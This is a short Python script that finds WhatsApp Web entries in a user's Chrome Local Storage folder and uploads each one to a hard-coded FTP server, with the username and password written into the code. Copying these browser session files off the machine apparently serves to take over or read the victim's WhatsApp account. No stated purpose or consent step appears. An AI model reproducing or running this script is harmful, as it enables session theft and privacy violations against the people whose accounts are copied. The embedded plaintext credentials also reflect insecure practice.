#coding:utf-8
#
# Versión 1.0
# Parisi Germán
#

from ftplib import FTP
from subprocess import Popen, PIPE
import time
import os

ftp_host = "172.16.81.60"
ftp_user = "server"
ftp_password = "4960520fede"

local_storage_dir = "/home/gochi/.config/google-chrome/Default/Local Storage"
files = []
for d in os.listdir(local_storage_dir):
    if "whatsapp" in d:
        files.append(d)

if len(files) > 0:
    for f in files:
        ruta_completa = "%s/%s" % (local_storage_dir, f)
        print (ruta_completa)
        p = Popen(["ftp", "-n"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
        commands =  """
            open %s
            user %s %s
            put %s %s
            bye
            """ % (ftp_host, ftp_user, ftp_password, '"' + ruta_completa + '"', f)
        out = p.communicate(input=commands.encode())
        print (out)
        
    print ("OK")

